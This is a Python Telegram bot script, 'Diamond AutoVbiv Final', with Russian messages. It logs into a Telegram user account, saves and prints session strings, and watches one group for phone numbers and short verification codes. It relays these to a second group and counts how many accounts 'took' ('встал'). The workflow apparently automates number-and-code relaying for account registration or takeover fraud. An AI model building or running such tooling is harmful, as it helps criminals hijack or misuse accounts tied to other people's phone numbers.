# diamond_autovbiv_final.py
import os, asyncio, re, sqlite3, shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.custom import Button
from telethon.sessions import StringSession

API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
DB_PATH = "/app/diamond_data.db"
BACKUP_DIR = "/app/backups"
os.makedirs(BACKUP_DIR, exist_ok=True)

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ Установите API_ID, API_HASH, BOT_TOKEN в Railway")
    exit(1)

# ---------- БД ----------
class DB:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS sessions 
            (user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, step TEXT, created_at TIMESTAMP)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS groups 
            (user_id INTEGER PRIMARY KEY, source_group INTEGER, target_group INTEGER)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS pending 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT, code TEXT, status TEXT, created_at TIMESTAMP)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS stats 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT, action TEXT, timestamp TIMESTAMP)''')
        self.conn.commit()
    def save_session(self, uid, phone, sess, step):
        self.c.execute('REPLACE INTO sessions (user_id,phone,session_string,step,created_at) VALUES (?,?,?,?,?)',
                       (uid, phone, sess, step, datetime.now()))
        self.conn.commit()
    def get_session(self, uid):
        row = self.c.execute('SELECT session_string, phone, step FROM sessions WHERE user_id=?', (uid,)).fetchone()
        return row if row else (None, None, None)
    def is_auth(self, uid): return bool(self.get_session(uid)[0])
    def set_groups(self, uid, src, tgt):
        self.c.execute('REPLACE INTO groups (user_id,source_group,target_group) VALUES (?,?,?)', (uid,src,tgt))
        self.conn.commit()
    def get_groups(self, uid):
        row = self.c.execute('SELECT source_group, target_group FROM groups WHERE user_id=?', (uid,)).fetchone()
        return row if row else (None, None)
    def add_pending(self, uid, phone):
        self.c.execute('INSERT INTO pending (user_id,phone,status,created_at) VALUES (?,?,"waiting_code",?)',
                       (uid, phone, datetime.now()))
        self.conn.commit()
    def update_pending_code(self, phone, code):
        self.c.execute('UPDATE pending SET code=?, status="code_received" WHERE phone=? AND status="waiting_code"', (code, phone))
        self.conn.commit()
    def mark_success(self, phone):
        self.c.execute('UPDATE pending SET status="success" WHERE phone=? AND status="code_received"', (phone,))
        self.conn.commit()
    def add_stat(self, uid, phone, action):
        self.c.execute('INSERT INTO stats (user_id,phone,action,timestamp) VALUES (?,?,?,?)', (uid, phone, action, datetime.now()))
        self.conn.commit()
    def stats_today(self, uid):
        today = datetime.now().replace(hour=0,minute=0,second=0)
        d = dict(self.c.execute('SELECT action, COUNT(*) FROM stats WHERE user_id=? AND timestamp>=? GROUP BY action', (uid, today)).fetchall())
        return d.get('number_taken',0), d.get('code_taken',0), d.get('success',0)
    def last_pending_phone(self, uid):
        row = self.c.execute('SELECT phone FROM pending WHERE user_id=? AND status="waiting_code" ORDER BY created_at DESC LIMIT 1', (uid,)).fetchone()
        return row[0] if row else None
    def export_db(self, uid):
        p = os.path.join(BACKUP_DIR, f"backup_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, p)
        return p
    def import_db(self, path):
        shutil.copy2(path, DB_PATH)
        self.conn.close()
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.c = self.conn.cursor()

db = DB()

# ---------- общие функции ----------
def clean_phone(p):
    p = re.sub(r'[^\d+]', '', p).lstrip('+')
    if p.startswith('8'): p = '7' + p[1:]
    if len(p) == 10: p = '7' + p
    if len(p) == 11: return '+' + p
    return None

def extract_phone(text):
    for m in re.findall(r'\+?\d{10,12}', text):
        c = clean_phone(m)
        if c: return c
    return None

def extract_code(text):
    m = re.search(r'\b(\d{4,8})\b', text)
    return m.group(1) if m else None

# ---------- клиенты ----------
bot = None          # бот-токен (личные сообщения)
user_clients = {}   # uid -> авторизованный юзер-клиент (StringSession)
code_inputs = {}    # временные данные для ввода кода

def code_keyboard():
    return [[Button.inline(str(i), str(i).encode()) for i in row] for row in [[1,2,3],[4,5,6],[7,8,9]]] + \
           [[Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅", b"submit")]]

# ---------- обработчики юзер-клиента (группы) ----------
async def setup_user_handlers(uid, client):
    @client.on(events.NewMessage(pattern='(?i)/set_source'))
    async def src_cmd(e):
        if e.is_group:
            src = e.chat_id
            _, tgt = db.get_groups(uid)
            db.set_groups(uid, src, tgt)
            await e.reply(f"✅ Источник = {src}")
    @client.on(events.NewMessage(pattern='(?i)/set_target'))
    async def tgt_cmd(e):
        if e.is_group:
            tgt = e.chat_id
            src, _ = db.get_groups(uid)
            db.set_groups(uid, src, tgt)
            await e.reply(f"✅ Цель = {tgt}")
    # слушатель источника (номера, коды)
    src, _ = db.get_groups(uid)
    if src:
        @client.on(events.NewMessage(chats=src))
        async def src_listener(e):
            if e.sender_id == (await client.get_me()).id: return
            txt = e.raw_text.strip()
            ph = extract_phone(txt)
            if ph:
                db.add_pending(uid, ph)
                db.add_stat(uid, ph, 'number_taken')
                _, tgt = db.get_groups(uid)
                if tgt: await client.send_message(tgt, f"📱 НОМЕР: `{ph}`")
                return
            cd = extract_code(txt)
            if cd:
                last = db.last_pending_phone(uid)
                if last:
                    db.update_pending_code(last, cd)
                    db.add_stat(uid, last, 'code_taken')
                    _, tgt = db.get_groups(uid)
                    if tgt: await client.send_message(tgt, f"🔢 КОД: `{cd}`\nДля номера: `{last}`")
    # слушатель цели (встал)
    _, tgt = db.get_groups(uid)
    if tgt:
        @client.on(events.NewMessage(chats=tgt))
        async def tgt_listener(e):
            txt = e.raw_text.lower()
            if 'встал' in txt or 'успех' in txt:
                ph = extract_phone(txt)
                if not ph: ph = db.last_pending_phone(uid)
                if ph:
                    db.mark_success(ph)
                    db.add_stat(uid, ph, 'success')
                    await e.reply(f"✅ {ph} — ВСТАЛ!")

# ---------- обработчики бота (личные сообщения) ----------
async def setup_bot_handlers():
    global bot
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(e):
        await e.reply("💎 Diamond AutoVbiv Final\n/login +7xxx\n/set_source /set_target в группах\n/status /stats /export /import /restore <string>")
    @bot.on(events.NewMessage(pattern='/login (.+)'))
    async def login(e):
        uid = e.sender_id
        phone = clean_phone(e.pattern_match.group(1))
        if not phone: return await e.reply("❌ Неверный номер")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_clients[uid] = client
            db.save_session(uid, phone, "", "waiting_code")
            code_inputs[uid] = {'code':'', 'phone':phone, 'attempts':0}
            await e.reply(f"✅ Код отправлен на {phone}\nВведите код кнопками:", buttons=code_keyboard())
        except Exception as ex: await e.reply(f"❌ {ex}")
    @bot.on(events.CallbackQuery())
    async def callb(e):
        uid = e.sender_id
        if uid not in code_inputs: return await e.answer("Сначала /login", alert=True)
        data = e.data.decode()
        cur = code_inputs[uid]
        if data.isdigit():
            cur['code'] += data
            await e.answer(f"Код: {cur['code']}")
            await e.edit(f"Код: `{cur['code']}`", buttons=code_keyboard())
        elif data == 'del':
            cur['code'] = cur['code'][:-1]
            await e.answer("Удалено")
            await e.edit(f"Код: `{cur['code']}`", buttons=code_keyboard())
        elif data == 'submit':
            if not cur['code']: return await e.answer("Введите код", alert=True)
            await e.answer("Проверка...")
            client = user_clients.get(uid)
            if not client: return await e.edit("❌ Клиент потерян, /login заново")
            try:
                await client.sign_in(code=cur['code'])
                sess = client.session.save()
                me = await client.get_me()
                db.save_session(uid, me.phone, sess, "authorized")
                user_clients[uid] = client
                await setup_user_handlers(uid, client)
                await e.edit(f"✅ Вход! Аккаунт: {me.phone}\nSession: `{sess}`")
                await e.client.send_message(uid, f"🔑 Сохраните session_string:\n`{sess}`")
                del code_inputs[uid]
            except PhoneCodeInvalidError:
                cur['attempts'] += 1
                if cur['attempts'] >= 3: await e.edit("❌ 3 ошибки, начните /login заново"); del code_inputs[uid]
                else:
                    cur['code'] = ''
                    await e.edit(f"❌ Неверный код. Осталось попыток: {3-cur['attempts']}\nКод: ` `", buttons=code_keyboard())
            except SessionPasswordNeededError:
                db.save_session(uid, cur['phone'], "", "waiting_2fa")
                await e.edit("🔐 Требуется 2FA: /2fa <пароль>")
                del code_inputs[uid]
            except Exception as ex: await e.edit(f"❌ {ex}"); del code_inputs[uid]
    @bot.on(events.NewMessage(pattern='/2fa (.+)'))
    async def twofa(e):
        uid = e.sender_id
        pwd = e.pattern_match.group(1)
        _, _, step = db.get_session(uid)
        client = user_clients.get(uid)
        if not client or step != "waiting_2fa": return await e.reply("❌ Сначала /login")
        try:
            await client.sign_in(password=pwd)
            sess = client.session.save()
            me = await client.get_me()
            db.save_session(uid, me.phone, sess, "authorized")
            await setup_user_handlers(uid, client)
            await e.reply(f"✅ Вход с 2FA! Аккаунт: {me.phone}\nSession: `{sess}`")
        except Exception as ex: await e.reply(f"❌ {ex}")
    @bot.on(events.NewMessage(pattern='/status'))
    async def status(e):
        uid = e.sender_id
        sess, phone, _ = db.get_session(uid)
        src, tgt = db.get_groups(uid)
        await e.reply(f"Аккаунт: {phone or '❌'}\nАвторизован: {'✅' if sess else '❌'}\nИсточник: {src or '❌'}\nЦель: {tgt or '❌'}")
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats(e):
        uid = e.sender_id
        n, c, s = db.stats_today(uid)
        await e.reply(f"📊 Сегодня:\nНомера: {n}\nКоды: {c}\nВстало: {s}")
    @bot.on(events.NewMessage(pattern='/export'))
    async def exp(e):
        uid = e.sender_id
        if not db.is_auth(uid): return await e.reply("❌ Сначала /login")
        path = db.export_db(uid)
        await e.reply("📦 БД выгружена")
        await bot.send_file(e.chat_id, path, caption="diamond_data.db")
    @bot.on(events.NewMessage(pattern='/import'))
    async def imp_req(e):
        uid = e.sender_id
        await e.reply("📥 Отправьте файл .db для импорта")
        @bot.on(events.NewMessage(func=lambda m: m.sender_id==uid and m.file and m.file.name.endswith('.db')))
        async def do_imp(msg):
            path = f"/tmp/imp_{uid}.db"
            await msg.download_media(path)
            db.import_db(path)
            os.remove(path)
            # пересоздаём юзер-клиента
            sess, phone, _ = db.get_session(uid)
            if sess:
                try:
                    cl = TelegramClient(StringSession(sess), API_ID, API_HASH)
                    await cl.connect()
                    if await cl.is_user_authorized():
                        user_clients[uid] = cl
                        await setup_user_handlers(uid, cl)
                        await msg.reply(f"✅ Импорт OK, сессия для {phone} восстановлена")
                    else:
                        await msg.reply("⚠️ БД импортирована, но сессия недействительна. Используйте /login")
                except Exception as ex: await msg.reply(f"❌ Ошибка: {ex}")
            else:
                await msg.reply("✅ Импорт выполнен, но сессии нет. Выполните /login")
    @bot.on(events.NewMessage(pattern='/restore (.+)'))
    async def restore(e):
        uid = e.sender_id
        sess_str = e.pattern_match.group(1)
        try:
            cl = TelegramClient(StringSession(sess_str), API_ID, API_HASH)
            await cl.connect()
            if await cl.is_user_authorized():
                me = await cl.get_me()
                db.save_session(uid, me.phone, sess_str, "authorized")
                user_clients[uid] = cl
                await setup_user_handlers(uid, cl)
                await e.reply(f"✅ Сессия восстановлена для {me.phone}")
            else:
                await e.reply("❌ Невалидная session_string")
        except Exception as ex: await e.reply(f"❌ {ex}")
    @bot.on(events.NewMessage(pattern='/reset'))
    async def reset(e):
        uid = e.sender_id
        if uid in user_clients: await user_clients[uid].disconnect()
        for k in list(user_clients): del user_clients[k]
        db.c.execute('DELETE FROM sessions WHERE user_id=?', (uid,))
        db.c.execute('DELETE FROM groups WHERE user_id=?', (uid,))
        db.conn.commit()
        await e.reply("✅ Сброшено. Используйте /login")

# ---------- восстановление сессий при старте ----------
async def restore_all():
    rows = db.c.execute('SELECT user_id, session_string FROM sessions WHERE session_string IS NOT NULL AND session_string!=""').fetchall()
    for uid, ss in rows:
        try:
            cl = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await cl.connect()
            if await cl.is_user_authorized():
                user_clients[uid] = cl
                await setup_user_handlers(uid, cl)
                print(f"[+] Восстановлен user {uid}")
        except Exception as e: print(f"[-] Ошибка восстановления {uid}: {e}")

# ---------- main ----------
async def main():
    global bot
    print("💎 Diamond AutoVbiv Final")
    bot = TelegramClient("diamond_bot", API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    await restore_all()
    await setup_bot_handlers()
    print("✅ Бот запущен. Команды в группах работают через ваш аккаунт.")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
